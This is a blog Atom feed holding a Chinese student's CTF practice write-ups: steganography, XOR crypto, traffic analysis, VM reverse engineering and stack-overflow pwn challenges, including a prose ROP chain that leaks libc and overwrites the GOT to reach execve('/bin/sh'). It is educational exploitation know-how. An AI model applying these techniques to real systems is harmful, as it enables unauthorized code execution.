<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Spine</title>
  <subtitle>www</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://spinee.gitcafe.io/"/>
  <updated>2016-03-01T08:57:58.367Z</updated>
  <id>http://spinee.gitcafe.io/</id>
  
  <author>
    <name>spine</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>寒假练习</title>
    <link href="http://spinee.gitcafe.io/2016/02/26/practice1/"/>
    <id>http://spinee.gitcafe.io/2016/02/26/practice1/</id>
    <published>2016-02-26T04:38:31.000Z</published>
    <updated>2016-03-01T08:57:58.367Z</updated>
    
    <content type="html">&lt;p&gt;wp&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;Week1&quot;&gt;&lt;a href=&quot;#Week1&quot; class=&quot;headerlink&quot; title=&quot;Week1&quot;&gt;&lt;/a&gt;Week1&lt;/h1&gt;&lt;h2 id=&quot;MISC_u4ECE0_u5F00_u59CB_u4E4BSteg&quot;&gt;&lt;a href=&quot;#MISC_u4ECE0_u5F00_u59CB_u4E4BSteg&quot; class=&quot;headerlink&quot; title=&quot;MISC从0开始之Steg&quot;&gt;&lt;/a&gt;MISC从0开始之Steg&lt;/h2&gt;&lt;p&gt;一开始并不会做，然而有了隐写工具链接后下载之，自带Unhide，于是拿到flag&lt;/p&gt;
&lt;h2 id=&quot;WEB_u4ECE0_u5F00_u59CB_u4E4BPHP_u4EE3_u7801_u5BA1_u8BA10&quot;&gt;&lt;a href=&quot;#WEB_u4ECE0_u5F00_u59CB_u4E4BPHP_u4EE3_u7801_u5BA1_u8BA10&quot; class=&quot;headerlink&quot; title=&quot;WEB从0开始之PHP代码审计0&quot;&gt;&lt;/a&gt;WEB从0开始之PHP代码审计0&lt;/h2&gt;&lt;p&gt;hctf一模一样的题，把md5改成了sha1，做法一样233&lt;/p&gt;
&lt;h2 id=&quot;u5BC6_u7801_u5B66_u4ECE0_u5F00_u59CB_u4E4B1-1&quot;&gt;&lt;a href=&quot;#u5BC6_u7801_u5B66_u4ECE0_u5F00_u59CB_u4E4B1-1&quot; class=&quot;headerlink&quot; title=&quot;密码学从0开始之1.1&quot;&gt;&lt;/a&gt;密码学从0开始之1.1&lt;/h2&gt;&lt;p&gt;F12看到一串01串，尝试把它变成16进制串，发现开头为0x89504E47，嗯，png图嘛，话说这算密码学?&lt;/p&gt;
&lt;h2 id=&quot;u5BC6_u7801_u5B66_u4ECE0_u5F00_u59CB_u4E4B1&quot;&gt;&lt;a href=&quot;#u5BC6_u7801_u5B66_u4ECE0_u5F00_u59CB_u4E4B1&quot; class=&quot;headerlink&quot; title=&quot;密码学从0开始之1&quot;&gt;&lt;/a&gt;密码学从0开始之1&lt;/h2&gt;&lt;p&gt;摩斯密码，找个在线翻译就可以&lt;/p&gt;
&lt;h2 id=&quot;MISC_u4ECE0_u5F00_u59CB_u4E4B_u6D41_u91CF_u5206_u67901&quot;&gt;&lt;a href=&quot;#MISC_u4ECE0_u5F00_u59CB_u4E4B_u6D41_u91CF_u5206_u67901&quot; class=&quot;headerlink&quot; title=&quot;MISC从0开始之流量分析1&quot;&gt;&lt;/a&gt;MISC从0开始之流量分析1&lt;/h2&gt;&lt;p&gt;分析后发现最后有个flag的get请求，查看返回内容，得到一个gzip的文件，解压之~&lt;/p&gt;
&lt;h2 id=&quot;MISC_u4ECE0_u5F00_u59CB_u4E4B_u7F16_u78011&quot;&gt;&lt;a href=&quot;#MISC_u4ECE0_u5F00_u59CB_u4E4B_u7F16_u78011&quot; class=&quot;headerlink&quot; title=&quot;MISC从0开始之编码1&quot;&gt;&lt;/a&gt;MISC从0开始之编码1&lt;/h2&gt;&lt;p&gt;base全家桶，真没什么好说的&lt;/p&gt;
&lt;h2 id=&quot;lightless_26amp_3Baklis_u7684_u6E17_u900F_u6559_u5BA4-2&quot;&gt;&lt;a href=&quot;#lightless_26amp_3Baklis_u7684_u6E17_u900F_u6559_u5BA4-2&quot; class=&quot;headerlink&quot; title=&quot;lightless&amp;amp;aklis的渗透教室-2&quot;&gt;&lt;/a&gt;lightless&amp;amp;aklis的渗透教室-2&lt;/h2&gt;&lt;p&gt;用的是burp，一共3个要求：&lt;br&gt;你应当来自google.com&lt;br&gt;你的xff应当来自本地&lt;br&gt;你应当使用iOS 99访问本页面&lt;br&gt;第一个改referer，第二个改X-Forwarded-For为127.0.0.1，第3个给了ios9的User-Agent，把9改成99就行了,在返回头里可以看到flag&lt;/p&gt;
&lt;h2 id=&quot;MISC__u9A7E_u9A76_u6280_u672F_u79D1_u76EE_u4E00&quot;&gt;&lt;a href=&quot;#MISC__u9A7E_u9A76_u6280_u672F_u79D1_u76EE_u4E00&quot; class=&quot;headerlink&quot; title=&quot;MISC 驾驶技术科目一&quot;&gt;&lt;/a&gt;MISC 驾驶技术科目一&lt;/h2&gt;&lt;p&gt;流量分析，过滤get请求，可以找到first/xxxx的那几个请求，貌似flag会随机出现在这里面的一个，拿到一串base64字符串，解码拿到flag&lt;/p&gt;
&lt;h2 id=&quot;MISC__u9A7E_u9A76_u6280_u672F_u79D1_u76EE_u4E8C&quot;&gt;&lt;a href=&quot;#MISC__u9A7E_u9A76_u6280_u672F_u79D1_u76EE_u4E8C&quot; class=&quot;headerlink&quot; title=&quot;MISC 驾驶技术科目二&quot;&gt;&lt;/a&gt;MISC 驾驶技术科目二&lt;/h2&gt;&lt;p&gt;拿到的flag再做一次base64，得到科目2的图片，binwalk跑一下，发现有一个zip的结尾，把zip的头找出来，解压，由于时间过去久远，忘了解压后拿到什么东西了，反正应该flag很容易能找到，顺便科目3的上车地址在图片2的描述那&lt;/p&gt;
&lt;h2 id=&quot;u90A3_u4E9B_u5E74_u6211_u4EEC_u8131_u8FC7_u7684_u8863_u88F3&quot;&gt;&lt;a href=&quot;#u90A3_u4E9B_u5E74_u6211_u4EEC_u8131_u8FC7_u7684_u8863_u88F3&quot; class=&quot;headerlink&quot; title=&quot;那些年我们脱过的衣裳&quot;&gt;&lt;/a&gt;那些年我们脱过的衣裳&lt;/h2&gt;&lt;p&gt;一个简单的upx壳，脱了之后打开没反应，于是看程序，发现它是先打开同目录下的flag.txt读取里面的字符做处理来判断是否通过，判断十分简单，先对输入的每个字符xor 0xDE后再和预设的字符串比较，解出来后即为flag。&lt;/p&gt;
&lt;h2 id=&quot;u6742_u8D27_u5806_u91CC_u7FFB_u51FA_u6765_u9898&quot;&gt;&lt;a href=&quot;#u6742_u8D27_u5806_u91CC_u7FFB_u51FA_u6765_u9898&quot; class=&quot;headerlink&quot; title=&quot;杂货堆里翻出来题&quot;&gt;&lt;/a&gt;杂货堆里翻出来题&lt;/h2&gt;&lt;p&gt;貌似这题好像是做过，但时间更久远，还是重做了一遍，一开始是对内存的解码工作，od更改eip到入口点，直接跳到jump那，现在想要静态调试的话，dump即可，但由于加花和其他种种原因，单纯的静态分析起来有点困难，于是动态调，算法不算很复杂，慢慢调吧&lt;/p&gt;
&lt;h2 id=&quot;u8FA3_u9E21sublime&quot;&gt;&lt;a href=&quot;#u8FA3_u9E21sublime&quot; class=&quot;headerlink&quot; title=&quot;辣鸡sublime&quot;&gt;&lt;/a&gt;辣鸡sublime&lt;/h2&gt;&lt;p&gt;找到那个字符串，od改掉那几处跳转就行了&lt;/p&gt;
&lt;h2 id=&quot;Where_is_flag&quot;&gt;&lt;a href=&quot;#Where_is_flag&quot; class=&quot;headerlink&quot; title=&quot;Where is flag&quot;&gt;&lt;/a&gt;Where is flag&lt;/h2&gt;&lt;p&gt;嗯，这题自己出的，本来想写的更复杂些，自己先绕晕了就算了233。先是要找到输入框在哪，用resource hacker改一下输入框的位置，然后应该很容易就能看出来程序在做一个方程组，解出来第一个按钮按两下就能看到flag啦&lt;/p&gt;
&lt;h2 id=&quot;CTF_coding_step1&quot;&gt;&lt;a href=&quot;#CTF_coding_step1&quot; class=&quot;headerlink&quot; title=&quot;CTF coding step1&quot;&gt;&lt;/a&gt;CTF coding step1&lt;/h2&gt;&lt;p&gt;不多说，上脚本，后面式子形式会变一次，到最后要判断下是不是结束了，还有repr这个坑&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; zio&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;target = (&lt;span class=&quot;string&quot;&gt;&#39;115.29.77.78&#39;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;9979&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;io = zio.zio(target)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;io.read_until(&lt;span class=&quot;string&quot;&gt;&#39;=\n&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;number&quot;&gt;300&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    a = io.readline()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    b = a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    list(b)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; b[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&#39;m&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        io.interact()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    a = a.replace(&lt;span class=&quot;string&quot;&gt;&#39;=&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    a = a.replace(&lt;span class=&quot;string&quot;&gt;&#39;\n&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    a = a.replace(&lt;span class=&quot;string&quot;&gt;&#39;[*]&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    a = a.replace(&lt;span class=&quot;string&quot;&gt;&#39;×&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    a = a.replace(&lt;span class=&quot;string&quot;&gt;&#39;÷&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    a = eval(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; i &amp;lt; &lt;span class=&quot;number&quot;&gt;50&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        a = &lt;span class=&quot;string&quot;&gt;&#39;%d&#39;&lt;/span&gt;%a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        io.write(a+&lt;span class=&quot;string&quot;&gt;&#39;\n&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        a = repr(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        io.write(a+&lt;span class=&quot;string&quot;&gt;&#39;\n&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;io.close()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;pwn_step0&quot;&gt;&lt;a href=&quot;#pwn_step0&quot; class=&quot;headerlink&quot; title=&quot;pwn step0&quot;&gt;&lt;/a&gt;pwn step0&lt;/h2&gt;&lt;p&gt;输入一段a即可&lt;/p&gt;
&lt;h2 id=&quot;pwn_step1&quot;&gt;&lt;a href=&quot;#pwn_step1&quot; class=&quot;headerlink&quot; title=&quot;pwn step1&quot;&gt;&lt;/a&gt;pwn step1&lt;/h2&gt;&lt;p&gt;既然函数没有被调用过，手动跳过去呗，溢出，返回改成foo函数&lt;/p&gt;
&lt;h2 id=&quot;RE-HCTF_450&quot;&gt;&lt;a href=&quot;#RE-HCTF_450&quot; class=&quot;headerlink&quot; title=&quot;RE-HCTF 450&quot;&gt;&lt;/a&gt;RE-HCTF 450&lt;/h2&gt;&lt;p&gt;vm，花了好久才做出来，说下思路吧，一开始看到那串push吓了一跳，push后有两个call，第一个猜测是给每个函数一个标号，最后用标号来调用这些函数，olldbg调发现第二个call里有call eax这么个东西，多次实验发现调用的就是前面标号的那些函数，而且栈上刚好有那个标号，于是下断点，结合push进去的字节码+多次试验最后可以大致猜出每个字节码的意义，然后最重要的，我在虚拟的cmp指令下断点，反复试验，找到判断点后，发现了数据基本就在同一个地方，这个意味着我们只要一直看着这地方，在那些操作数据的函数下断点，我们就可以清晰的明白数据处理流程。&lt;br&gt;于是把函数分为对数据操作的函数，和无用的函数（字节码操作跳转啊啥的），F9在call eax的地方看看栈上的标号决定跳还是不跳，也可以把这个断点去掉，在那些有用的函数内部下断点，这样可能更快&lt;br&gt;大概有这么几个有用的函数：&lt;br&gt;03：作偏移; 05：xor; 08：shl; 09：and; 07：shr; 0E：strlen; 06：cmp; 01 40 xx：往存数据的地方放入xx; 0A：or&lt;br&gt;接下来是处理了：&lt;br&gt;在前面找判断点的时候基本上摸清了flag格式&lt;br&gt;flag形式为HCTF{XXXXYYYYZZZZMMMMMMM HCTF{可以试出来就没去看&lt;br&gt;检验顺序为HCTF{ ZYXM&lt;br&gt;做偏移用的字符串：0123456789qazwsxedcrtgbyhnujmiolp&lt;br&gt;对Z的处理如下：&lt;br&gt;对4字节长度的Z，取Z最高5位做偏移，然后shl(z,5)循环，得到的字符串和75qrzz8比较&lt;br&gt;对4字节长度的Y，先对Y做反向，这个反向是ascii码+字节顺序的反向，然后rol(Y,3)，再次反向，做和Z同样的操作后和mqzht4e比较&lt;br&gt;对4字节长度的Z，先同样做反向，然后rol(Z,3)，和Z类似，但这次是右移5位取低5位，而且每次得到的结果还要加30，得到的字符串和158F9D2比较&lt;br&gt;对7字节长度的M，每一个M都xor 22，这一部分想想太简单，应该是防作弊的时候加的吧。&lt;br&gt;应该说程序本身的各种合适条件，这题才没有变得非要写个程序，或用到什么高端科技才能做出来，要是搞个多个变量存放地点，再比如call不是只有call eax一处……当然以上只是脑洞，也许会有更简单的方法？&lt;/p&gt;
&lt;h1 id=&quot;Week2&quot;&gt;&lt;a href=&quot;#Week2&quot; class=&quot;headerlink&quot; title=&quot;Week2&quot;&gt;&lt;/a&gt;Week2&lt;/h1&gt;&lt;h2 id=&quot;u5BC6_u7801_u5B66_u4ECE0_u5F00_u59CB_u4E4B2-0&quot;&gt;&lt;a href=&quot;#u5BC6_u7801_u5B66_u4ECE0_u5F00_u59CB_u4E4B2-0&quot; class=&quot;headerlink&quot; title=&quot;密码学从0开始之2.0&quot;&gt;&lt;/a&gt;密码学从0开始之2.0&lt;/h2&gt;&lt;p&gt;简单的对称密码，一开始直接复制发现编码问题，于是尝试抓包，拿到两串字符串，因为没看到密钥，数了数密文明文长度都一样，所以抱着试一试的想法xor了一下，发现还真是。。。异或加密，如下图&lt;br&gt;&lt;img src=&quot;/img/post/week2_1.png&quot; alt=&quot;week2_1&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;MISC__u9A7E_u9A76_u6280_u672F_u79D1_u76EE_u4E09&quot;&gt;&lt;a href=&quot;#MISC__u9A7E_u9A76_u6280_u672F_u79D1_u76EE_u4E09&quot; class=&quot;headerlink&quot; title=&quot;MISC 驾驶技术科目三&quot;&gt;&lt;/a&gt;MISC 驾驶技术科目三&lt;/h2&gt;&lt;p&gt;对比两张图片，base64一下&lt;/p&gt;
&lt;h2 id=&quot;MISC__u9A7E_u9A76_u6280_u672F_u79D1_u76EE_u56DB&quot;&gt;&lt;a href=&quot;#MISC__u9A7E_u9A76_u6280_u672F_u79D1_u76EE_u56DB&quot; class=&quot;headerlink&quot; title=&quot;MISC 驾驶技术科目四&quot;&gt;&lt;/a&gt;MISC 驾驶技术科目四&lt;/h2&gt;&lt;p&gt;已知明文攻击，暂时不知道原理，但找到了软件，于是跑了一下出来了&lt;/p&gt;
&lt;h2 id=&quot;WEB_u4ECE0_u5F00_u59CB_u4E4Bxss_challenge0-5_26amp_3BWEB_u4ECE0_u5F00_u59CB_u4E4Bxss_challenge1&quot;&gt;&lt;a href=&quot;#WEB_u4ECE0_u5F00_u59CB_u4E4Bxss_challenge0-5_26amp_3BWEB_u4ECE0_u5F00_u59CB_u4E4Bxss_challenge1&quot; class=&quot;headerlink&quot; title=&quot;WEB从0开始之xss challenge0.5&amp;amp;WEB从0开始之xss challenge1&quot;&gt;&lt;/a&gt;WEB从0开始之xss challenge0.5&amp;amp;WEB从0开始之xss challenge1&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://drops.wooyun.org/tips/845&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;参考&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;lightless_26amp_3Baklis_u7684_u6E17_u900F_u6559_u5BA4-3&quot;&gt;&lt;a href=&quot;#lightless_26amp_3Baklis_u7684_u6E17_u900F_u6559_u5BA4-3&quot; class=&quot;headerlink&quot; title=&quot;lightless&amp;amp;aklis的渗透教室-3&quot;&gt;&lt;/a&gt;lightless&amp;amp;aklis的渗透教室-3&lt;/h2&gt;&lt;p&gt;在返回头里看到cookie内容，按要求改就是了&lt;/p&gt;
&lt;h2 id=&quot;pwn_step2&quot;&gt;&lt;a href=&quot;#pwn_step2&quot; class=&quot;headerlink&quot; title=&quot;pwn step2&quot;&gt;&lt;/a&gt;pwn step2&lt;/h2&gt;&lt;p&gt;古老的栈溢出，没开NX，而且一开始的printf给出了栈地址，于是直接跳到shellcode执行就行&lt;/p&gt;
&lt;h2 id=&quot;pwn_step3&quot;&gt;&lt;a href=&quot;#pwn_step3&quot; class=&quot;headerlink&quot; title=&quot;pwn step3&quot;&gt;&lt;/a&gt;pwn step3&lt;/h2&gt;&lt;p&gt;程序有一个&lt;code&gt;read&lt;/code&gt;和&lt;code&gt;write&lt;/code&gt;，还开了NX，一开始想了很多，后来才发现too young，google找到了一道类似的题，于是就借鉴一下，先给个&lt;a href=&quot;https://ctf-team.vulnhub.com/whitehat-ctf-2015-pwn200/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;地址&lt;/a&gt;，再把思路给理一下&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1.第一次栈溢出，跳到write函数，并构造wirte的参数，write出got表的内容，这样就能得到libc的地址了&lt;br&gt;2.write完先清栈(因为要跳到read)，write有3个参数，于是找到一个3个pop连一个ret的地方，跳过去&lt;br&gt;*ret = pop eip,所以嘛，为了跳转到read，这三个参数不能留&lt;br&gt;3.这样ret返回后就会跳到我们构造好的read里，同时我们可以构造read的参数，选择覆盖got表的&lt;code&gt;libc_start_main&lt;/code&gt;到事先算好的libc的指定地方execve(“/bin/sh”)，当程序执行到我们给的&lt;code&gt;libc_start_main&lt;/code&gt;时，就会执行execve(“/bin/sh”)了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;于是这题就这么愉快的解决了www&lt;/p&gt;
&lt;h1 id=&quot;Week3&quot;&gt;&lt;a href=&quot;#Week3&quot; class=&quot;headerlink&quot; title=&quot;Week3&quot;&gt;&lt;/a&gt;Week3&lt;/h1&gt;&lt;h2 id=&quot;MISC__u9A7E_u9A76_u6280_u672F_u79D1_u76EE_u4E94&quot;&gt;&lt;a href=&quot;#MISC__u9A7E_u9A76_u6280_u672F_u79D1_u76EE_u4E94&quot; class=&quot;headerlink&quot; title=&quot;MISC 驾驶技术科目五&quot;&gt;&lt;/a&gt;MISC 驾驶技术科目五&lt;/h2&gt;&lt;p&gt;略坑爹的一题，拿各种姿势试了下，去问了下ak菊苣，才知道是LSB，如下图同时看3个通道，可以看到一串base64字符串&lt;br&gt;&lt;img src=&quot;/img/post/week3_1.png&quot; alt=&quot;week3_1&quot;&gt;&lt;br&gt;一开始拿去解码的我：噫，怎么解不出来，这题肯定错了！于是还是ak老司机：谁说解码后一定是可见字符的，瞬间QAQ，好吧，于是尝试把这些东西搞成个文件，又打不开Orz&lt;br&gt;之后问了z神，好吧，zlib压缩，此刻我的心情是十分XX的(之前研究了半天zlib，看到x^这个文件头感觉有点熟悉但又想不起来)，于是顺利的(雾)拿到flag和科目六的车&lt;/p&gt;
&lt;h2 id=&quot;MISC__u9A7E_u9A76_u6280_u672F_u79D1_u76EE_u516D&quot;&gt;&lt;a href=&quot;#MISC__u9A7E_u9A76_u6280_u672F_u79D1_u76EE_u516D&quot; class=&quot;headerlink&quot; title=&quot;MISC 驾驶技术科目六&quot;&gt;&lt;/a&gt;MISC 驾驶技术科目六&lt;/h2&gt;&lt;p&gt;相比科目五来说科目六就简单多了，给了一01串，数了数1225个，35*35，脑补二维码(电脑)，扫一扫拿到flag，就给个程序吧&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Image&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MAX = &lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pic = Image.new(&lt;span class=&quot;string&quot;&gt;&quot;RGB&quot;&lt;/span&gt;,(MAX, MAX))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;str = &lt;span class=&quot;string&quot;&gt;&quotquot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; y &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range (&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,MAX):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; x &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range (&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,MAX):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(str[i] == &lt;span class=&quot;string&quot;&gt;&#39;1&#39;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            pic.putpixel([x,y],(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            pic.putpixel([x,y],(&lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        i = i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pic.show()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pic.save(&lt;span class=&quot;string&quot;&gt;&quot;flag.png&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&quot;Week4&quot;&gt;&lt;a href=&quot;#Week4&quot; class=&quot;headerlink&quot; title=&quot;Week4&quot;&gt;&lt;/a&gt;Week4&lt;/h1&gt;&lt;h2 id=&quot;pwn4&quot;&gt;&lt;a href=&quot;#pwn4&quot; class=&quot;headerlink&quot; title=&quot;pwn4&quot;&gt;&lt;/a&gt;pwn4&lt;/h2&gt;&lt;p&gt;这题一开始还以为堆溢出，结果还是栈溢出，程序的作用是URL DECODE，不多说贴上问题代码&lt;br&gt;1: &lt;img src=&quot;/img/post/pwn4_1.png&quot; alt=&quot;pwn4.1&quot;&gt;&lt;br&gt;可以看到getc终止判断是0x0a&lt;br&gt;2: &lt;img src=&quot;/img/post/pwn4_2.png&quot; alt=&quot;pwn4.2&quot;&gt;&lt;br&gt;用strlen来做长度检测&lt;br&gt;3: &lt;img src=&quot;/img/post/pwn4_3.png&quot; alt=&quot;pwn4.3&quot;&gt;&lt;br&gt;对&lt;code&gt;*v1&lt;/code&gt;是否为0x00的判断在循环体内（判断条件为前一个字符是否为%）&lt;br&gt;4: &lt;img src=&quot;/img/post/pwn4_4.png&quot; alt=&quot;pwn4.4&quot;&gt;&lt;br&gt;把解码后的数据放在栈上，于是我们就可以用一个%+’\x00’来绕过长度检测+溢出栈&lt;br&gt;实验结果如下&lt;br&gt;&lt;img src=&quot;/img/post/pwn4_5.png&quot; 